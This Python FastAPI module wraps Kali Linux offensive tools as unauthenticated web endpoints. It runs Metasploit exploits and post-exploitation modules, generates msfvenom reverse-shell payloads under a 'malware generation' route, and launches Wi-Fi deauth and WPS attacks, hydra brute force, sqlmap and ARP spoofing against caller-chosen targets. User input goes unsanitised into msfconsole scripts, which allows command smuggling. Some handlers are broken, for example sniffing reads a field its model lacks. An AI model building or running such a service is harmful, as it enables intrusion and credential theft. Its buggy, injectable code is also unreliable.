"""
Kali Linux Tools Integration - Comprehensive Security Tools Orchestration
Categories: Reconnaissance, Scanning, Exploitation, Post-Exploit, Malware, Forensics
"""

from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any
import subprocess
import re

router = APIRouter()

# ==================== PYDANTIC MODELS ====================

class ReconRequest(BaseModel):
    target: str = Field(..., description="Target IP or domain")
    tool: str = Field(default="theHarvester", description="Recon tool to use")
    
class ScanRequest(BaseModel):
    target: str = Field(..., description="Target IP or network")
    scan_type: str = Field(default="nmap", description="Scan type: nmap, masscan, etc.")
    ports: Optional[str] = None
    aggressive: bool = False
    
class ExploitRequest(BaseModel):
    exploit: str = Field(..., description="Exploit name/ID")
    target: str = Field(..., description="Target system")
    payload: Optional[str] = None
    options: Optional[Dict[str, Any]] = None
    
class PostExploitRequest(BaseModel):
    session_id: str = Field(..., description="Metasploit session ID")
    module: str = Field(..., description="Post-exploitation module")
    options: Optional[Dict[str, Any]] = None
    
class MalwareGenRequest(BaseModel):
    payload: str = Field(..., description="Payload type (windows/meterpreter/reverse_tcp)")
    lhost: str = Field(..., description="Local host IP")
    lport: int = Field(default=4444, description="Local port")
    format: str = Field(default="exe", description="Output format: exe, elf, ps1, etc.")
    encoder: Optional[str] = None
    
class ForensicRequest(BaseModel):
    target: str = Field(..., description="Target file/directory/image")
    tool: str = Field(default="autopsy", description="Forensic tool: autopsy, sleuthkit, binwalk")
    
class WirelessRequest(BaseModel):
    interface: str = Field(..., description="Wireless interface (e.g., wlan0)")
    attack_type: str = Field(default="deauth", description="Attack type: deauth, handshake, etc.")
    target_bssid: Optional[str] = None
    
class PasswordAttackRequest(BaseModel):
    service: str = Field(..., description="Target service: ssh, ftp, http, etc.")
    target: str = Field(..., description="Target IP")
    username_list: str = Field(..., description="Path to username wordlist")
    password_list: str = Field(..., description="Path to password wordlist")
    port: Optional[int] = None

class SQLiRequest(BaseModel):
    url: str = Field(..., description="Target URL with parameters")
    level: int = Field(default=1, description="Test level (1-5)")
    risk: int = Field(default=1, description="Risk level (1-3)")
    
class SniffingRequest(BaseModel):
    interface: str = Field(..., description="Network interface")
    filter: Optional[str] = None
    duration: int = Field(default=60, description="Capture duration in seconds")


# ==================== RECONNAISSANCE TOOLS ====================

@router.post("/recon", tags=["Kali Tools - Reconnaissance"])
async def reconnaissance(request: ReconRequest):
    """
    Information Gathering & Reconnaissance
    
    Tools: theHarvester, recon-ng, maltego, shodan, whois, nslookup
    """
    try:
        if request.tool == "theHarvester":
            cmd = ["theHarvester", "-d", request.target, "-b", "google,linkedin,github"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
        elif request.tool == "whois":
            cmd = ["whois", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
        elif request.tool == "nslookup":
            cmd = ["nslookup", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
        elif request.tool == "dnsrecon":
            cmd = ["dnsrecon", "-d", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown recon tool: {request.tool}")
        
        return {
            "tool": request.tool,
            "target": request.target,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Reconnaissance timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== SCANNING & ENUMERATION ====================

@router.post("/scan/enumeration", tags=["Kali Tools - Scanning"])
async def enumeration_scan(request: ScanRequest):
    """
    Advanced Scanning & Enumeration
    
    Tools: nmap, masscan, enum4linux, smbclient, nikto
    """
    try:
        if request.scan_type == "nmap":
            cmd = ["nmap", "-sV", "-sC", request.target]
            if request.ports:
                cmd.extend(["-p", request.ports])
            if request.aggressive:
                cmd.append("-A")
                
        elif request.scan_type == "masscan":
            cmd = ["masscan", "-p1-65535", request.target, "--rate=1000"]
            
        elif request.scan_type == "enum4linux":
            cmd = ["enum4linux", "-a", request.target]
            
        elif request.scan_type == "nikto":
            cmd = ["nikto", "-h", request.target]
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown scan type: {request.scan_type}")
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        return {
            "scan_type": request.scan_type,
            "target": request.target,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Scan timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== EXPLOITATION ====================

@router.post("/exploit", tags=["Kali Tools - Exploitation"])
async def exploitation(request: ExploitRequest):
    """
    Exploitation via Metasploit Framework
    
    Tools: msfconsole, searchsploit, exploitdb
    """
    try:
        # Use searchsploit to find exploits
        if request.exploit == "searchsploit":
            cmd = ["searchsploit", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                "tool": "searchsploit",
                "query": request.target,
                "results": result.stdout
            }
        
        # Use Metasploit
        elif request.exploit.startswith("exploit/"):
            msf_commands = f"""
use {request.exploit}
set RHOSTS {request.target}
{f"set PAYLOAD {request.payload}" if request.payload else ""}
{f"set {chr(10).join([f'{k} {v}' for k, v in request.options.items()]) if request.options else ""}"}
run
exit
"""
            cmd = ["msfconsole", "-q", "-x", msf_commands]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            return {
                "exploit": request.exploit,
                "target": request.target,
                "output": result.stdout,
                "errors": result.stderr
            }
        
        else:
            raise HTTPException(status_code=400, detail="Invalid exploit format")
            
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Exploitation timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== POST-EXPLOITATION ====================

@router.post("/post-exploit", tags=["Kali Tools - Post-Exploitation"])
async def post_exploitation(request: PostExploitRequest):
    """
    Post-Exploitation Modules
    
    Tools: Metasploit post modules, mimikatz, powershell empire
    """
    try:
        msf_commands = f"""
use post/{request.module}
set SESSION {request.session_id}
{f"set {chr(10).join([f'{k} {v}' for k, v in request.options.items()]) if request.options else ""}"}
run
exit
"""
        cmd = ["msfconsole", "-q", "-x", msf_commands]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        return {
            "module": request.module,
            "session": request.session_id,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Post-exploitation timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== MALWARE GENERATION ====================

@router.post("/malware/generate", tags=["Kali Tools - Malware Generation"])
async def malware_generation(request: MalwareGenRequest):
    """
    Payload & Malware Generation
    
    Tools: msfvenom, veil, shellter, backdoor-factory
    """
    try:
        output_file = f"/tmp/payload_{request.format}"
        
        cmd = [
            "msfvenom",
            "-p", request.payload,
            f"LHOST={request.lhost}",
            f"LPORT={request.lport}",
            "-f", request.format,
            "-o", output_file
        ]
        
        if request.encoder:
            cmd.extend(["-e", request.encoder])
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        return {
            "payload": request.payload,
            "format": request.format,
            "output_file": output_file,
            "command": " ".join(cmd),
            "stdout": result.stdout,
            "stderr": result.stderr
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== FORENSICS ====================

@router.post("/forensics", tags=["Kali Tools - Forensics"])
async def forensics_analysis(request: ForensicRequest):
    """
    Digital Forensics Tools
    
    Tools: autopsy, sleuthkit, binwalk, foremost, volatilit
    """
    try:
        if request.tool == "binwalk":
            cmd = ["binwalk", "-e", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
        elif request.tool == "foremost":
            cmd = ["foremost", "-i", request.target, "-o", "/tmp/foremost_output"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
        elif request.tool == "strings":
            cmd = ["strings", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
        elif request.tool == "exiftool":
            cmd = ["exiftool", request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown forensic tool: {request.tool}")
        
        return {
            "tool": request.tool,
            "target": request.target,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Forensics analysis timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== WIRELESS ATTACKS ====================

@router.post("/wireless", tags=["Kali Tools - Wireless Attacks"])
async def wireless_attacks(request: WirelessRequest):
    """
    Wireless Network Attacks
    
    Tools: aircrack-ng, reaver, wifite, kismet
    """
    try:
        if request.attack_type == "deauth":
            # Aireplay-ng deauthentication
            cmd = [
                "aireplay-ng",
                "--deauth", "10",
                "-a", request.target_bssid or "TARGET_BSSID",
                request.interface
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
        elif request.attack_type == "handshake":
            # Airodump-ng capture
            cmd = [
                "airodump-ng",
                "--write", "/tmp/capture",
                "--bssid", request.target_bssid or "TARGET_BSSID",
                request.interface
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
        elif request.attack_type == "wps":
            # Reaver WPS attack
            cmd = [
                "reaver",
                "-i", request.interface,
                "-b", request.target_bssid or "TARGET_BSSID",
                "-vv"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown wireless attack: {request.attack_type}")
        
        return {
            "attack": request.attack_type,
            "interface": request.interface,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Wireless attack timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== PASSWORD ATTACKS ====================

@router.post("/password-attack", tags=["Kali Tools - Password Attacks"])
async def password_attacks(request: PasswordAttackRequest):
    """
    Password Cracking & Attacks
    
    Tools: hydra, john, hashcat, crunch, cewl
    """
    try:
        if request.service == "hydra":
            cmd = [
                "hydra",
                "-L", request.username_list,
                "-P", request.password_list,
                request.target,
                request.service
            ]
            if request.port:
                cmd.extend(["-s", str(request.port)])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            
        elif request.service == "john":
            cmd = ["john", "--wordlist=" + request.password_list, request.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            
        elif request.service == "hashcat":
            cmd = [
                "hashcat",
                "-m", "0",  # MD5
                "-a", "0",  # Dictionary attack
                request.target,
                request.password_list
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown password attack service: {request.service}")
        
        return {
            "service": request.service,
            "target": request.target,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Password attack timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== WEB APPLICATION ATTACKS ====================

@router.post("/web/sqli", tags=["Kali Tools - Web Application Attacks"])
async def sql_injection(request: SQLiRequest):
    """
    SQL Injection Attacks
    
    Tools: sqlmap, havij
    """
    try:
        cmd = [
            "sqlmap",
            "-u", request.url,
            "--level", str(request.level),
            "--risk", str(request.risk),
            "--batch",
            "--random-agent"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        
        return {
            "url": request.url,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="SQL injection test timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/web/xss", tags=["Kali Tools - Web Application Attacks"])
async def xss_detection(url: str):
    """
    XSS Detection
    
    Tools: xsstrike, dalfox
    """
    try:
        cmd = ["xsstrike", "-u", url]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        return {
            "url": url,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== SNIFFING & SPOOFING ====================

@router.post("/sniffing", tags=["Kali Tools - Sniffing & Spoofing"])
async def sniffing(request: SniffingRequest):
    """
    Network Sniffing & Spoofing
    
    Tools: wireshark, tcpdump, bettercap, arpspoof
    """
    try:
        if request.tool == "tcpdump":
            cmd = [
                "tcpdump",
                "-i", request.interface,
                "-c", "100",  # Capture 100 packets
                "-w", "/tmp/capture.pcap"
            ]
            if request.filter:
                cmd.extend([request.filter])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=request.duration)
            
        elif request.tool == "arpspoof":
            cmd = [
                "arpspoof",
                "-i", request.interface,
                "-t", request.filter or "TARGET",
                request.interface
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=request.duration)
            
        else:
            raise HTTPException(status_code=400, detail=f"Unknown sniffing tool: {request.tool}")
        
        return {
            "tool": request.tool,
            "interface": request.interface,
            "output": result.stdout,
            "errors": result.stderr
        }
        
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Sniffing operation timed out")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== TOOLS CATALOG ====================

@router.get("/tools/catalog", tags=["Kali Tools - Info"])
async def get_tools_catalog():
    """
    Get complete catalog of available Kali Linux tools by category
    """
    catalog = {
        "reconnaissance": [
            "theHarvester", "maltego", "recon-ng", "shodan", "whois", 
            "nslookup", "dnsrecon", "dig", "fierce"
        ],
        "scanning": [
            "nmap", "masscan", "rustscan", "enum4linux", "smbclient",
            "nikto", "gobuster", "dirb", "wfuzz"
        ],
        "exploitation": [
            "metasploit-framework", "msfconsole", "msfvenom", 
            "searchsploit", "exploitdb", "beef"
        ],
        "post-exploitation": [
            "mimikatz", "powershell-empire", "psexec", "wmic",
            "meterpreter", "keylogger"
        ],
        "malware-analysis": [
            "yara", "peframe", "clamav", "radare2", "ghidra",
            "strings", "objdump", "strace"
        ],
        "forensics": [
            "autopsy", "sleuthkit", "binwalk", "foremost", 
            "volatility", "exiftool", "bulk-extractor"
        ],
        "wireless": [
            "aircrack-ng", "reaver", "wifite", "kismet",
            "mdk4", "hostapd"
        ],
        "password-attacks": [
            "hydra", "john", "hashcat", "hash-identifier",
            "crunch", "cewl", "mentalist"
        ],
        "web-attacks": [
            "sqlmap", "nikto", "burpsuite", "owasp-zap", 
            "xsstrike", "dalfox", "wpscan"
        ],
        "sniffing-spoofing": [
            "wireshark", "tcpdump", "bettercap", "arpspoof",
            "dsniff", "ettercap"
        ]
    }
    
    return {
        "total_categories": len(catalog),
        "catalog": catalog
    }
